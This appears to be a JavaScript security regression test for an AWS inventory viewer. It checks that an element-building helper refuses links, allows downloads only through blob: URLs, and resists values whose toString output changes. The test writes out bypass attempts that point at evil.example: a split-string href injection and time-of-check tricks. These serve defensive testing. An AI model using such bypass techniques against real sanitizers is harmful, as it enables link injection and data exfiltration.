// Follow-up security behaviour of the viewer, run by tests/test_security_followup.py: A.h refuses every <a> (also the
// residual bypass of the first fix), each tag/value is converted to text once, the download link is only ever a blob:
// URL, and the Scan info tab does not count refused calls as AWS calls. Loads util.js, charts.js and scan.js into a
// Node VM with a minimal fake DOM and prints {"failures": [...], "scanText": "..."} on stdout.
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const JS = path.join(__dirname, '..', '..', 'viewer', 'js');
const failures = [];
const check = (cond, msg) => { if (!cond) failures.push(msg); };

class FakeNode {
  constructor(tag, ns) { this.tagName = tag; this.ns = ns || null; this.attrs = {}; this.children = []; this.dataset = {}; this.style = { setProperty() {} }; }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  appendChild(c) { this.children.push(c); return c; }
  addEventListener() {}
  set className(v) { this.attrs.class = v; }
  click() { clicks.push([this.tagName, this.attrs.href]); }
  remove() { this.removed = true; }
}
const clicks = [];
const created = [];
const document = {
  createElement: (t) => { const n = new FakeNode(t); created.push(n); return n; },
  createElementNS: (ns, t) => { const n = new FakeNode(t, ns); created.push(n); return n; },
  createTextNode: (t) => ({ text: t }),
  body: new FakeNode('body'),
};
const window = { localStorage: { getItem: () => null, setItem() {} }, innerWidth: 1200, innerHeight: 800 };
let objectUrl = 'blob:null/1d2c';
const context = vm.createContext({
  window, document, Node: FakeNode, console, setTimeout: () => 0, Intl,
  URL: { createObjectURL: () => objectUrl, revokeObjectURL() {} },
  Blob: class { constructor(parts, opts) { this.parts = parts; this.type = opts && opts.type; } },
});
for (const f of ['util.js', 'charts.js', 'scan.js']) {
  vm.runInContext(fs.readFileSync(path.join(JS, f), 'utf8'), context, { filename: f });
}
const A = window.AWSA;

function refused(label, fn) {
  let err = null;
  try { fn(); } catch (e) { err = e; }
  check(err && /refusing/.test(String(err.message)), `${label}: should be refused, got ${err ? err.message : 'no error'}`);
}

// ---- A.h builds no link at all, so the residual bypass (computed href key + computed setAttribute name) fails --------
refused('a blob: download link through A.h', () => A.h('a', { href: 'blob:null/1', download: 'x.csv' }));
refused('residual bypass', () => {
  const tg = 'a';
  const lk = A.h(tg, { ['hr' + 'ef']: 'blob:x', download: 'f' });
  lk.setAttribute('hr' + 'ef', 'ht' + 'tp:/' + '/evil.example/?d=1');
  lk.click();
});
check(!clicks.some(([, href]) => /^(?!blob:)/.test(String(href))), `no non-blob link may be clicked: ${JSON.stringify(clicks)}`);

// ---- the tag and SVG values are converted to text once (an object's toString cannot answer differently later) -------
let n = 0;
const sneaky = { toString() { return n++ ? 'a' : 'div'; } };
const before = created.length;
try { A.h(sneaky, {}); } catch (e) { /* refusing is fine too */ }
const made = created.slice(before).map((x) => String(x.tagName).toLowerCase());
check(!made.includes('a'), `a tag object whose toString changes must never create <a>: ${JSON.stringify(made)}`);
let m = 0;
const href = { toString() { return m++ ? 'https://evil.example/x.svg#a' : '#arr'; } };
let use = null;
try { use = A.svg('use', { href }); } catch (e) { /* refusing is fine too */ }
check(!use || use.attrs.href === '#arr', `the checked SVG value must be the value set: ${use && use.attrs.href}`);

// ---- the download link: only a blob: URL, never through A.h -----------------------------------------------------------
A.downloadBlob('inventory.csv', new context.Blob(['x'], { type: 'text/csv' }));
const link = created.filter((x) => x.tagName === 'a').pop();
check(link && link.attrs.href === objectUrl && link.download === 'inventory.csv' && link.removed, 'downloadBlob must click and remove a blob: link');
objectUrl = 'https://evil.example/?d=1';
const clicksBefore = clicks.length;
refused('a download whose URL is not blob:', () => A.downloadBlob('x.csv', new context.Blob(['x'])));
check(clicks.length === clicksBefore, 'a refused download must not click anything');

// ---- Scan info: refused calls are not counted as AWS calls; the UnsafeArgument gap is explained -----------------------
A.data = {
  audit: [
    { service: 'sts', op: 'get-caller-identity', status: 'ok', ms: 5 },
    { service: 'ec2', op: 'describe-regions', status: 'ok', ms: 5 },
    { service: 'dynamodb', op: 'describe-table', status: 'refused', ms: 0, code: 'UnsafeArgument' },
  ],
  gaps: [{ service: 'dynamodb', op: 'describe-table', region: 'eu-west-1', code: 'UnsafeArgument', count: 1, message: 'refused before any process started' }],
  accounts: [], scan_options: {},
};
const root = new FakeNode('main');
A.tabs.scan.render(root);
const text = [];
(function walk(x) {
  if (x == null) return;
  if (typeof x.text === 'string') text.push(x.text);
  (x.children || []).forEach(walk);
})(root);
process.stdout.write(JSON.stringify({ failures, scanText: text.join(' | ') }));
